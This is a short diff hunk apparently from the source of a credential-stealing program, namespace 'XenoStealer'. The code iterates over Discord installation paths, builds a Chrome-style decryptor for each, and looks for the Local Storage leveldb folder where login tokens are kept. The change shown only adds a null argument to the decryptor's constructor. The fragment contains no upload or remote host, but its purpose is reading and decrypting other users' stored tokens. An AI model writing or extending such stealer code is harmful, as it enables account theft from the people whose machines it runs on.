@@ -70,7 +70,7 @@ namespace XenoStealer
             foreach (string i in Configuration.DiscordPaths)
             {
 
-                ChromeDecryptor decryptor = new ChromeDecryptor(i);
+                ChromeDecryptor decryptor = new ChromeDecryptor(i, null);
 
                 string leveldbsPath = Path.Combine(i, "Local Storage", "leveldb");
                 if (!Directory.Exists(leveldbsPath))
